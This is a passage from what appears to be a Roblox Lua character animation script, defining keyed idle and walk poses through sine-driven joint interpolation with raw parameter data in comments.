			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.75, -0.2) * angles(2.705260340591211 - 0.08726646259971647 * sin((sine + 0.1) * 2), -2.792526803190927, -0.6981317007977318), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.75, -0.2) * angles(2.705260340591211 - 0.08726646259971647 * sin((sine + 0.1) * 2), 2.792526803190927, 0.6981317007977318), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.9198621771937625 - 0.10471975511965978 * sin((sine + 0.3) * 2), 0, 3.141592653589793), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -2.45 - 0.05 * sin(sine * 2), 0) * angles(0.03490658503988659 * sin(sine * 2), 0, 3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.3962634015954636 - 0.03490658503988659 * sin(sine * 2), 1.3089969389957472, -0.9599310885968813), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.03490658503988659 * sin(sine * 2), -1.3089969389957472, 1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,2,155,-5,0.1,2,0.75,0,0,2,-160,0,0,2,-0.2,0,0,2,-40,0,0,2,RightArm,1,0,0,2,155,-5,0.1,2,0.75,0,0,2,160,0,0,2,-0.2,0,0,2,40,0,0,2,Head,0,0,0,2,-110,-6,0.3,2,1,0,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,Torso,0,0,0,2,0,2,0,2,-2.45,-0.05,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,RightLeg,1,0,0,2,80,-2,0,2,-1,0,0,2,75,0,0,2,0,0,0,2,-55,0,0,2,LeftLeg,-1,0,0,2,90,-2,0,2,-1,0,0,2,-75,0,0,2,0,0,0,2,90,0,0,2
		end
	})
	addmode("e", {
		idle = function()
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9, 0.4 + 0.1 * sin(sine * 2), 0.3 - 0.15 * sin(sine * 2)) * angles(-1.0471975511965976 - 0.12217304763960307 * sin(sine * 2), -1.3962634015954636, -0.6981317007977318), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -1.85 - 0.1 * sin((sine + 0.2) * 2), 0) * angles(-1.3962634015954636 + 0.03490658503988659 * sin(sine * 2), -0.08726646259971647, 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.4 + 0.1 * sin(sine * 2), 0.2 - 0.15 * sin(sine * 2)) * angles(0.6108652381980153 - 0.12217304763960307 * sin(sine * 2), 1.2217304763960306, -0.7853981633974483), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.6580627893946132 - 0.03490658503988659 * sin((sine + 0.6) * 2), 0.10471975511965978 + 0.06981317007977318 * sin(sine * 0.66), 3.141592653589793 + 0.3490658503988659 * sin(sine * 0.66)), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, 0.2 + 0.15 * sin((sine + 0.2) * 2), -0.7 + 0.1 * sin(sine * 2)) * angles(1.4835298641951802 + 0.03490658503988659 * sin(sine * 2), 1.4835298641951802, -1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.75 + 0.1 * sin((sine + 0.2) * 2), -0.5) * angles(1.3962634015954636 - 0.03490658503988659 * sin(sine * 2), -1.6580627893946132, 0), deltaTime) 
			--LeftArm,-0.9,0,0,2,-60,-7,0,2,0.4,0.1,0,2,-80,0,0,2,0.3,-0.15,0,2,-40,0,0,2,Torso,0,0,0,2,-80,2,0,2,-1.85,-0.1,0.2,2,-5,0,0,2,0,0,0,2,180,0,0,2,RightArm,1,0,0,2,35,-7,0,2,0.4,0.1,0,2,70,0,0,2,0.2,-0.15,0,2,-45,0,0,2,Head,0,0,0,2,-95,-2,0.6,2,1,0,0,2,6,4,0,0.66,0,0,0,2,180,20,0,0.66,RightLeg,1,0,0,2,85,2,0,2,0.2,0.15,0.2,2,85,0,0,2,-0.7,0.1,0,2,-90,0,0,2,LeftLeg,-1,0,0,2,80,-2,0,2,-0.75,0.1,0.2,2,-95,0,0,2,-0.5,0,0,2,0,0,0,2
		end
	})
	addmode("r", {
		idle = function()
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.9 - 0.2 * sin(sine * 2), 0) * angles(1.5707963267948966, 1.6580627893946132 - 0.17453292519943295 * sin(sine + 0.8), -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0.3 * sin(sine + 0.8), -0.1 + 0.2 * sin(sine * 2), 0) * angles(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin((sine - 0.5) * 2), 0.08726646259971647 * sin(sine - 1), -3.141592653589793 + 0.2617993877991494 * sin(sine * 5)), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1 + 0.1 * sin(sine * 7), 0.2 - 0.1 * sin(sine + 0.8), -0.25) * angles(1.5707963267948966 + 0.5235987755982988 * sin(sine * 7), -0.6981317007977318, 0.3490658503988659 * sin(sine * 7)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.9 - 0.2 * sin(sine * 2), 0) * angles(1.5707963267948966, -1.6580627893946132 - 0.17453292519943295 * sin(sine + 0.8), 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 + 0.1 * sin(sine * 7), 0.2 + 0.1 * sin(sine + 0.8), -0.25) * angles(1.5707963267948966 - 0.5235987755982988 * sin(sine * 7), 0.6981317007977318, 0.3490658503988659 * sin(sine * 7)), deltaTime) 
			--RightLeg,1,0,0,1,90,0,0,1,-0.9,-0.2,0,2,95,-10,0.8,1,0,0,0,1,-90,0,0,1,Torso,0,0.3,0.8,1,-90,0,0,1,-0.1,0.2,0,2,0,0,0,1,0,0,0,1,-180,0,0,1,Head,0,0,0,1,-90,5,-0.5,2,1,0,0,1,0,5,-1,1,0,0,0,1,-180,15,0,5,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1,0.1,0,7,90,30,0,7,0.2,-0.1,0.8,1,-40,0,0,1,-0.25,0,0,1,0,20,0,7,LeftLeg,-1,0,0,1,90,0,0,1,-0.9,-0.2,0,2,-95,-10,0.8,1,0,0,0,1,90,0,0,1,RightArm,1,0.1,0,7,90,-30,0,7,0.2,0.1,0.8,1,40,0,0,1,-0.25,0,0,1,-0,20,0,7
		end
	})         
	addmode("t", {
		idle = function()
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(1.5707963267948966, -1.6580627893946132 + 0.08726646259971647 * sin((sine - 0.3) * 4), 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 + 0.15 * sin((sine - 0.4) * 4), 1.42, 0) * angles(1.5707963267948966, 1.4835298641951802 - 0.3490658503988659 * sin((sine - 0.4) * 4), 1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.4835298641951802, 0.04363323129985824 - 0.08726646259971647 * sin((sine + 0.1) * 4), -3.141592653589793 + 0.04363323129985824 * sin(sine * 4)), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0.1 * sin(sine * 4), 0, 0) * angles(-1.5707963267948966, -0.08726646259971647 + 0.08726646259971647 * sin(sine * 4), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1.1 + 0.1 * sin(sine * 4), 0) * angles(1.5707963267948966, 1.5707963267948966 + 0.08726646259971647 * sin(sine * 4), -1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1 - 0.02 * sin(sine * 4), -0.925 - 0.07 * sin(sine * 4), 0) * angles(1.5707963267948966, -1.7453292519943295 + 0.08726646259971647 * sin(sine * 4), 1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,4,90,0,0,4,0.5,0,0,4,-95,5,-0.3,4,0,0,0,4,90,0,0,4,RightArm,1,0.15,-0.4,4,90,0,0,4,1.42,0,0,4,85,-20,-0.4,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-85,0,0,4,1,0,0,4,2.5,-5,0.1,4,0,0,0,4,-180,2.5,0,4,Torso,0,0.1,0,4,-90,0,0,4,0,0,0,4,-5,5,0,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,0,0,4,-1.1,0.1,0,4,90,5,0,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,-0.02,0,4,90,0,0,4,-0.925,-0.07,0,4,-100,5,0,4,0,0,0,4,90,0,0,4
		end
	})
	addmode("y", {
		idle = function()
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * angles(-1.7453292519943295, 0.17453292519943295 - 0.04363323129985824 * sin(sine * 2), -1.4835298641951802), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.9000000953674316 - 0.1 * sin(sine * 2), 0) * angles(-1.3962634015954636, 1.3962634015954636, 1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1.0000001192092896 - 0.1 * sin(sine * 2), 0) * angles(-1.5707963267948966, -1.3962634015954636, -1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-2.0943951023931953 + 0.08726646259971647 * sin((sine - 1) * 2), -0.08726646259971647, 2.792526803190927), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 1.2000000476837158, 0) * angles(2.6179938779914944 + 0.08726646259971647 * sin((sine - 1) * 2), 0.6981317007977318, -1.3962634015954636), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.1 * sin(sine * 2), 0) * angles(-1.6580627893946132, 0.08726646259971647, 3.0543261909900767), deltaTime) 
			--LeftArm,-1.5,0,0,2,-100,0,0,2,0.5,0,0,2,10,-2.5,0,2,0,0,0,2,-85,0,0,2,RightLeg,1,0,0,2,-80,0,0,2,-0.9000000953674316,-0.1,0,2,80,0,0,2,0,0,0,2,90,0,0,2,LeftLeg,-1,0,0,2,-90,0,0,2,-1.0000001192092896,-0.1,0,2,-80,0,0,2,0,0,0,2,-90,0,0,2,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,Head,0,0,0,2,-120,5,-1,2,1,0,0,2,-5,0,0,2,0,0,0,2,160,0,0,2,RightArm,1,0,0,2,150,5,-1,2,1.2000000476837158,0,0,2,40,0,0,2,0,0,0,2,-80,0,0,2,Torso,0,0,0,2,-95,0,0,2,0,0.1,0,2,5,0,0,2,0,0,0,2,175,0,0,2
		end
	})        
	addmode("u", {
		idle = function()
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.75 + 0.25 * sin(sine * 2), 0) * angles(-1.5707963267948966, 0, 3.141592653589793), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1.5 - 0.1 * sin((sine + 0.2) * 2), 0) * angles(-1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.4) * 2), 0, 3.141592653589793 + 0.3490658503988659 * sin(sine * 0.66)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-0.5 - 1 * sin((sine + 0.2) * 2.2), -0.75 - 0.25 * sin(sine * 2), 1 * sin((sine + 0.95) * 2.2)) * angles(0, -1.5707963267948966, 0), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(0.5 + 1 * sin((sine + 0.2) * 2.2), -0.75 - 0.25 * sin(sine * 2), -1 * sin((sine + 0.95) * 2.2)) * angles(0, 1.5707963267948966, 0), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(-0.5 - 1.85 * sin(sine * 2), 0.8 - 0.5 * sin(sine * 2), -1.85 * sin((sine + 0.75) * 2)) * angles(0, 1.5707963267948966, 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(0.5 + 1.85 * sin(sine * 2), 0.8 - 0.5 * sin(sine * 2), 1.85 * sin((sine + 0.75) * 2)) * angles(0, -1.5707963267948966, 0), deltaTime) 
			--Torso,0,0,0,2,-90,0,0,2,0.75,0.25,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,Head,0,0,0,2,-90,-5,0.4,2,1.5,-0.1,0.2,2,-0,0,0,2,0,0,0,2,180,20,0,0.66,LeftLeg,-0.5,-1,0.2,2.2,-0,0,0,2,-0.75,-0.25,0,2,-90,0,0,2,0,1,0.95,2.2,0,0,0,2,RightLeg,0.5,1,0.2,2.2,0,0,0,2,-0.75,-0.25,0,2,90,0,0,2,0,-1,0.95,2.2,0,0,0,2,RightArm,-0.5,-1.85,0,2,0,0,0,2,0.8,-0.5,0,2,90,0,0,2,0,-1.85,0.75,2,0,0,0,2,LeftArm,0.5,1.85,0,2,-0,0,0,2,0.8,-0.5,0,2,-90,0,0,2,0,1.85,0.75,2,0,0,0,2
		end
	})
	addmode("i", {
		idle = function()
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.5, 0.5 + 0.1 * sin((sine - 0.4444444444444444) * 9), 0) * angles(2.9670597283903604 + 0.17453292519943295 * sin((sine - 0.17777777777777778) * 9), -0.5235987755982988, 1.5707963267948966 + 0.17453292519943295 * sin(sine * 4.5)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.5 + 0.1 * sin((sine + 0.26666666666666666) * 4.5), -0.5) * angles(1.7453292519943295 - 1.0471975511965976 * sin(sine * 4.5), -1.5707963267948966 + 0.03490658503988659 * sin(sine * 4.5), 1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -0.5 + 0.5 * sin((sine + 0.17777777777777778) * 9), 0) * angles(-1.3962634015954636 - 0.03490658503988659 * sin((sine + 0.17777777777777778) * 9), -0.05235987755982989 * sin(sine * 4.5), 3.141592653589793 + 0.03490658503988659 * sin(sine * 4.5)), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1 + 0.2 * sin(sine * 9), 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin(sine * 9), 0.08726646259971647 * sin(sine * 4.5), 3.141592653589793 - 0.06981317007977318 * sin(sine * 4.5)), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.5, 0.5 + 0.1 * sin((sine - 0.4444444444444444) * 9), 0) * angles(2.9670597283903604 + 0.17453292519943295 * sin((sine - 0.17777777777777778) * 9), 0.5235987755982988, -1.5707963267948966 + 0.17453292519943295 * sin(sine * 4.5)), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.5 + 0.1 * sin((sine - 0.26666666666666666) * 4.5), -0.5) * angles(1.7453292519943295 + 1.0471975511965976 * sin(sine * 4.5), 1.5707963267948966 + 0.03490658503988659 * sin(sine * 4.5), -1.5707963267948966), deltaTime) 
			--LeftArm,-0.5,0,0,4.5,170,10,-0.17777777777777778,9,0.5,0.1,-0.4444444444444444,9,-30,0,0,4.5,0,0,0,4.5,90,10,0,4.5,LeftLeg,-1,0,0,4.5,100,-60,0,4.5,-0.5,0.1,0.26666666666666666,4.5,-90,2,0,4.5,-0.5,0,0,4.5,90,0,0,4.5,Torso,0,0,0,4.5,-80,-2,0.17777777777777778,9,-0.5,0.5,0.17777777777777778,9,-0,-3,0,4.5,0,0,0,4.5,180,2,0,4.5,Head,0,0,0,4.5,-90,5,0,9,1,0.2,0,9,-0,5,0,4.5,0,0,0,4.5,180,-4,0,4.5,RightArm,0.5,0,0,4.5,170,10,-0.17777777777777778,9,0.5,0.1,-0.4444444444444444,9,30,0,0,4.5,0,0,0,4.5,-90,10,0,4.5,RightLeg,1,0,0,4.5,100,60,0,4.5,-0.5,0.1,-0.26666666666666666,4.5,90,2,0,4.5,-0.5,0,0,4.5,-90,0,0,4.5
		end,
	})
	addmode("o", {
		idle = function()
			local rY, lY = raycastlegs()

			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 + lY, lY * -0.5) * angles(-1.8325957145940461 - 0.08726646259971647 * sin(sine * 2), -1.4835298641951802, -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0.09 * sin(sine * 2)) * angles(-1.3962634015954636 + 0.08726646259971647 * sin(sine * 2), -0.08726646259971647, 3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(2.9670597283903604 + 0.08726646259971647 * sin(sine * 1), -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.6) * 1), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1.1 + rY, rY * -0.5) * angles(-1.7453292519943295 - 0.08726646259971647 * sin(sine * 2), 1.5707963267948966, 1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.2217304763960306 - 0.08726646259971647 * sin((sine + 0.3) * 2), -0.2617993877991494 - 0.08726646259971647 * sin(sine * 2), 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(2.8797932657906435 + 0.08726646259971647 * sin(sine * 1), 1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.6) * 1), -1.5707963267948966), deltaTime) 
			--LeftLeg,-1,0,0,2,-105,-5,0,2,-1,0,0,2,-85,0,0,2,0,0,0,2,-90,0,0.75,2,Torso,0,0,0,2,-80,5,0,2,0,0,0,2,-5,0,0,2,0,0.09,0,2,180,0,0,2,LeftArm,-1,0,0,2,170,5,0,1,0.5,0,0,2,-90,5,0.6,1,0,0,0,2,90,0,0,2,RightLeg,1,0,0,2,-100,-5,0,2,-1.1,0,0,2,90,0,0,2,0,0,0,2,90,0,0.75,2,Head,0,0,0,2,-70,-5,0.3,2,1,0,0,2,-15,-5,0,2,0,0,0,2,180,0,0,2,RightArm,1,0,0,2,165,5,0,1,0.5,0,0,2,90,-5,0.6,1,0,0,0,2,-90,0,0,2
		end,
		walk = function()
			local fw, rt = velbycfrvec()

			local rY, lY = raycastlegs()

			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.04363323129985824 * sin(sine * 16), 0, 3.141592653589793 + 0.08726646259971647 * sin(sine * 8) - rt), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 - 0.3 * sin((sine + 0.15) * 8) + rY, rY * -0.5) * angles(-1.5707963267948966 - 0.6981317007977318 * sin(sine * 8) * fw, 1.5707963267948966 + 0.6981317007977318 * sin(sine * 8) * rt, 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(0.08726646259971647 * sin((sine - 0.05) * 16), 1.5707963267948966 + 0.08726646259971647 * sin(sine * 8) - rt/3, 1.5707963267948966), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(0.08726646259971647 * sin((sine - 0.05) * 16), -1.5707963267948966 + 0.08726646259971647 * sin(sine * 8) - rt/3, -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.1 * sin((sine + 0.1) * 16), 0) * angles(-1.5707963267948966, 0, 3.141592653589793 - 0.08726646259971647 * sin(sine * 8)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 + 0.3 * sin((sine + 0.15) * 8) + lY, lY * -0.5) * angles(1.5707963267948966 + 0.6981317007977318 * sin(sine * 8) * fw, -1.5707963267948966 + 0.6981317007977318 * sin(sine * 8) * rt, 1.5707963267948966), deltaTime) 
			--Head,0,0,0,8,-90,2.5,0,16,1,0,0,8,-0,0,0,8,0,0,0,8,180,5,0,8,RightLeg,1,0,0,8,-90,-40,0,8,-1,-0.3,0.15,8,90,40,0,8,0,0,0,8,90,0,0,8,RightArm,1,0,0,8,0,5,-0.05,16,0.5,0,0,8,90,5,0,8,0,0,0,8,90,0,0,8,LeftArm,-1,0,0,8,0,5,-0.05,16,0.5,0,0,8,-90,5,0,8,0,0,0,8,-90,0,0,8,Torso,0,0,0,8,-90,0,0,8,0,0.1,0.1,16,-0,0,0,8,0,0,0,8,180,-5,0,8,LeftLeg,-1,0,0,8,90,40,0,8,-1,0.3,0.15,8,-90,40,0,8,0,0,0,8,90,0,0,8
		end
	})
	addmode("p", {
		idle = function()
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.5, 0.5, 0) * angles(1.5707963267948966, 3.141592653589793, -1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, 1.5707963267948966, 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * angles(1.5707963267948966, 3.141592653589793, 1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, -1.5707963267948966, 0), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
			--RightArm,1.5,0,0,1,90,0,0,1,0.5,0,0,1,180,0,0,1,0,0,0,1,-90,0,0,1,RightLeg,1,0,0,1,0,0,0,1,-1,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1.5,0,0,1,90,0,0,1,0.5,0,0,1,180,0,0,1,0,0,0,1,90,0,0,1,LeftLeg,-1,0,0,1,-0,0,0,1,-1,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,Head,0,0,0,1,-90,0,0,1,1,0,0,1,0,0,0,1,0,0,0,1,-180,0,0,1,Torso,0,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,-180,0,0,1
		end
	})
	addmode("f", {
		idle = function()
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(-3.0543261909900767 - 0.17453292519943295 * sin((sine + 1.5) * 1), -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.6) * 1), -1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(3.141592653589793 - 0.08726646259971647 * sin(sine * 1), 0.3490658503988659 + 0.08726646259971647 * sin((sine + 0.3) * 1), -1.9198621771937625 + 0.08726646259971647 * sin((sine + 1) * 1)), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3089969389957472 - 0.2617993877991494 * sin((sine + 1.2) * 1), 0.08726646259971647 * sin((sine + 0.2) * 0.5), -2.9670597283903604), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 5 - 0.5 * sin((sine - 0.2) * 1), 0.2 * sin((sine - 1.2) * 1)) * angles(-0.08726646259971647 + 0.17453292519943295 * sin((sine + 1.2) * 1), 0.08726646259971647 * sin(sine * 0.5), 3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.3962634015954636 + 0.12217304763960307 * sin((sine + 1.5) * 1), -1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.9198621771937625 + 0.12217304763960307 * sin((sine + 1.5) * 1), 1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), -1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,1,-175,-10,1.5,1,0.5,0,0,1,-90,5,0.6,1,0,0,0,1,-90,0,0,1,RightArm,1,0,0,1,180,-5,0,1,0.5,0,0,1,20,5,0.3,1,0,0,0,1,-110,5,1,1,Head,0,0,0,1,-75,-15,1.2,1,1,0,0,1,-0,5,0.2,0.5,0,0,0,1,-170,0,0,1,Torso,0,0,0,1,-5,10,1.2,1,5,-0.5,-0.2,1,-0,5,0,0.5,0,0.2,-1.2,1,180,0,0,1,LeftLeg,-1,0,0,1,80,7,1.5,1,-1,0,0,1,-70,5,0.2,0.5,0,0,0,1,90,0,0,1,RightLeg,1,0,0,1,110,7,1.5,1,-1,0,0,1,70,5,0.2,0.5,0,0,0,1,-90,0,0,1
		end,
		walk = function()
			local fw, rt = velbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(-3.0543261909900767 - 0.17453292519943295 * sin((sine + 1.5) * 1) - fw * 0.1, -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.6) * 1) + rt * 0.2, -1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(3.141592653589793 - 0.08726646259971647 * sin(sine * 1), 0.3490658503988659 + 0.08726646259971647 * sin((sine + 0.3) * 1), -1.9198621771937625 + 0.08726646259971647 * sin((sine + 1) * 1)), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3089969389957472 - 0.2617993877991494 * sin((sine + 1.2) * 1) + fw * 0.1, 0.08726646259971647 * sin((sine + 0.2) * 0.5) - rt * 0.2, -2.9670597283903604), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 5 - 0.5 * sin((sine - 0.2) * 1), 0.2 * sin((sine - 1.2) * 1)) * angles(-0.08726646259971647 + 0.17453292519943295 * sin((sine + 1.2) * 1) - fw * 0.2, 0.08726646259971647 * sin(sine * 0.5), 3.141592653589793 - rt * 0.2), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.3962634015954636 + 0.12217304763960307 * sin((sine + 1.5) * 1) - fw * 0.2, -1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.9198621771937625 + 0.12217304763960307 * sin((sine + 1.5) * 1) - fw * 0.2, 1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), -1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,1,-175,-10,1.5,1,0.5,0,0,1,-90,5,0.6,1,0,0,0,1,-90,0,0,1,RightArm,1,0,0,1,180,-5,0,1,0.5,0,0,1,20,5,0.3,1,0,0,0,1,-110,5,1,1,Head,0,0,0,1,-75,-15,1.2,1,1,0,0,1,-0,5,0.2,0.5,0,0,0,1,-170,0,0,1,Torso,0,0,0,1,-5,10,1.2,1,5,-0.5,-0.2,1,-0,5,0,0.5,0,0.2,-1.2,1,180,0,0,1,LeftLeg,-1,0,0,1,80,7,1.5,1,-1,0,0,1,-70,5,0.2,0.5,0,0,0,1,90,0,0,1,RightLeg,1,0,0,1,110,7,1.5,1,-1,0,0,1,70,5,0.2,0.5,0,0,0,1,-90,0,0,1
		end
	})
	addmode("g", {
		idle = function()
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9 + 0.4 * sin(sine * 8), 0.5, 0.5 * sin((sine + 0.25) * 4)) * angles(1.5707963267948966, -1.5707963267948966 + 1.0471975511965976 * sin(sine * 8), 1.5707963267948966 + 0.6981317007977318 * sin((sine + 0.25) * 4)), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0.3 * sin((sine + 0.4) * 8), 0, 0) * angles(-1.5707963267948966, 0.3490658503988659 * sin(sine * 8), -3.141592653589793), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.061086523819801536 * sin((sine + 0.125) * 16), -0.3839724354387525 * sin(sine * 8), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.4 * sin((sine - 0.01) * 8), 0) * angles(1.5707963267948966, 1.7453292519943295 + 0.6981317007977318 * sin(sine * 8), -1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.4 * sin((sine - 0.01) * 8), 0) * angles(1.5707963267948966, -1.7453292519943295 + 0.6981317007977318 * sin(sine * 8), 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9 + 0.4 * sin(sine * 8), 0.5, -0.5 * sin((sine - 0.35) * 4)) * angles(1.5707963267948966 + 0.6981317007977318 * sin(sine * 4), 1.5707963267948966 + 1.0471975511965976 * sin(sine * 8), -1.5707963267948966 + 0.17453292519943295 * sin((sine - 0.35) * 4)), deltaTime) 
